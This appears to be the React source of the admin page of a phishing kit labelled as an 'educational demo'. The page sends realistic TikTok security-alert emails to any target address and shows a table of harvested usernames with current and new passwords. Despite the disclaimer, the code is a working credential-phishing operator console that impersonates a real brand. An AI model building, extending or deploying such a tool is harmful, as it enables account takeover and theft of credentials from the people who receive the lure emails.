import { useState } from "react";
import { Link } from "wouter";
import { format } from "date-fns";
import { useGetEntries, useSendAlert } from "@workspace/api-client-react";
import { Shield, KeyRound, Clock, User, AlertTriangle, ArrowLeft, Send, CheckCircle2, Loader2, Mail } from "lucide-react";

function SendAlertPanel() {
  const [email, setEmail] = useState("");
  const [sent, setSent] = useState(false);
  const { mutate: sendAlert, isPending, isError, error } = useSendAlert();

  const handleSend = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) return;
    sendAlert(
      { data: { email: email.trim() } },
      {
        onSuccess: () => {
          setSent(true);
          setEmail("");
          setTimeout(() => setSent(false), 4000);
        },
      },
    );
  };

  return (
    <div className="bg-card rounded-2xl border border-border/50 shadow-xl overflow-hidden">
      <div className="flex items-center gap-3 px-6 py-5 border-b border-border/50 bg-background/40">
        <div className="w-9 h-9 bg-primary/20 rounded-xl flex items-center justify-center text-primary">
          <Mail className="w-5 h-5" />
        </div>
        <div>
          <h2 className="text-lg font-bold text-white leading-tight">Send Security Alert Email</h2>
          <p className="text-xs text-muted-foreground mt-0.5">Sends a realistic TikTok security alert to the target email</p>
        </div>
      </div>

      <div className="p-6">
        <form onSubmit={handleSend} className="flex gap-3">
          <div className="relative flex-1">
            <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
            <input
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="target@email.com"
              className="w-full pl-10 pr-4 py-3 rounded-xl bg-background border border-border text-white text-sm placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/30 focus:border-primary transition-all"
            />
          </div>
          <button
            type="submit"
            disabled={isPending || !email.trim()}
            className="flex items-center gap-2 px-5 py-3 rounded-xl font-bold text-sm bg-primary text-white hover:bg-primary/90 disabled:opacity-50 disabled:cursor-not-allowed transition-all shadow-lg shadow-primary/20"
          >
            {isPending ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Sending...
              </>
            ) : (
              <>
                <Send className="w-4 h-4" />
                Send Alert
              </>
            )}
          </button>
        </form>

        {sent && (
          <div className="mt-4 flex items-center gap-2 text-green-400 text-sm font-medium bg-green-500/10 border border-green-500/20 rounded-xl px-4 py-3">
            <CheckCircle2 className="w-4 h-4 shrink-0" />
            Email sent successfully!
          </div>
        )}

        {isError && (
          <div className="mt-4 flex items-center gap-2 text-red-400 text-sm bg-red-500/10 border border-red-500/20 rounded-xl px-4 py-3">
            <AlertTriangle className="w-4 h-4 shrink-0" />
            {(error as Error)?.message ?? "Failed to send email. Check your Resend API key."}
          </div>
        )}
      </div>
    </div>
  );
}

export default function Admin() {
  const { data, isLoading, isError } = useGetEntries();

  return (
    <div className="min-h-screen bg-black text-white p-6 md:p-12 font-sans">
      <div className="max-w-7xl mx-auto space-y-8">

        <div className="flex items-center justify-between bg-card p-6 rounded-2xl border border-border/50 shadow-xl">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 bg-primary/20 rounded-xl flex items-center justify-center text-primary">
                <Shield className="w-6 h-6" />
              </div>
              <h1 className="text-3xl font-bold tracking-tight">Phishing Demo Panel</h1>
            </div>
            <p className="text-muted-foreground text-sm">Educational phishing demonstration panel. Unauthorized access is prohibited.</p>
          </div>

          <Link href="/" className="flex items-center gap-2 text-sm font-medium text-muted-foreground hover:text-white transition-colors bg-background px-4 py-2 rounded-lg border border-border/50 hover:border-border">
            <ArrowLeft className="w-4 h-4" />
            Back to Demo
          </Link>
        </div>

        <SendAlertPanel />

        <div className="bg-card rounded-2xl border border-border/50 shadow-xl overflow-hidden">
          <div className="flex items-center gap-3 px-6 py-5 border-b border-border/50 bg-background/40">
            <div className="w-9 h-9 bg-destructive/20 rounded-xl flex items-center justify-center text-destructive">
              <KeyRound className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-white leading-tight">Captured Credentials</h2>
              <p className="text-xs text-muted-foreground mt-0.5">Passwords submitted through the demo phishing form</p>
            </div>
          </div>

          {isLoading ? (
            <div className="flex flex-col items-center justify-center py-20">
              <div className="w-12 h-12 border-4 border-primary/30 border-t-primary rounded-full animate-spin mb-4" />
              <p className="text-muted-foreground font-medium animate-pulse">Loading captured data...</p>
            </div>
          ) : isError ? (
            <div className="m-6 bg-destructive/10 border border-destructive/30 p-6 rounded-2xl flex items-start gap-4">
              <AlertTriangle className="w-6 h-6 text-destructive shrink-0 mt-1" />
              <div>
                <h3 className="font-bold text-destructive text-lg">Error loading data</h3>
                <p className="text-destructive/80 mt-1">Make sure the backend API is running and accessible.</p>
              </div>
            </div>
          ) : (
            <>
              {data?.entries && data.entries.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full text-left border-collapse text-sm">
                    <thead>
                      <tr className="border-b border-border/50 bg-background/50 text-xs uppercase tracking-wider text-muted-foreground font-semibold">
                        <th className="px-5 py-4">
                          <div className="flex items-center gap-2"><User className="w-4 h-4" /> Username / Email</div>
                        </th>
                        <th className="px-5 py-4">
                          <div className="flex items-center gap-2"><KeyRound className="w-4 h-4" /> Current Password</div>
                        </th>
                        <th className="px-5 py-4">Confirm Current</th>
                        <th className="px-5 py-4">New Password</th>
                        <th className="px-5 py-4">Confirm New</th>
                        <th className="px-5 py-4 text-right">
                          <div className="flex items-center gap-2 justify-end"><Clock className="w-4 h-4" /> Submitted</div>
                        </th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-border/30">
                      {data.entries.map((entry) => (
                        <tr key={entry.id} className="hover:bg-white/5 transition-colors">
                          <td className="px-5 py-3 whitespace-nowrap font-medium text-white">{entry.username}</td>
                          <td className="px-5 py-3 whitespace-nowrap">
                            <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-secondary">{entry.currentPassword}</code>
                          </td>
                          <td className="px-5 py-3 whitespace-nowrap">
                            <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-muted-foreground">{entry.confirmCurrentPassword}</code>
                          </td>
                          <td className="px-5 py-3 whitespace-nowrap">
                            <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-green-400">{entry.newPassword}</code>
                          </td>
                          <td className="px-5 py-3 whitespace-nowrap">
                            <code className="px-2 py-0.5 bg-black rounded font-mono border border-border/50 text-muted-foreground">{entry.confirmNewPassword}</code>
                          </td>
                          <td className="px-5 py-3 whitespace-nowrap text-right text-muted-foreground">
                            {format(new Date(entry.submittedAt), "MMM d, yyyy • HH:mm:ss")}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="flex flex-col items-center justify-center py-24 text-center">
                  <div className="w-16 h-16 bg-background rounded-full flex items-center justify-center mb-4 border border-border/50">
                    <Shield className="w-8 h-8 text-muted-foreground/50" />
                  </div>
                  <h3 className="text-xl font-bold text-white mb-2">No entries yet</h3>
                  <p className="text-muted-foreground max-w-md">
                    When a user falls for the demo and submits their credentials, they will appear here.
                  </p>
                </div>
              )}
            </>
          )}
        </div>

      </div>
    </div>
  );
}
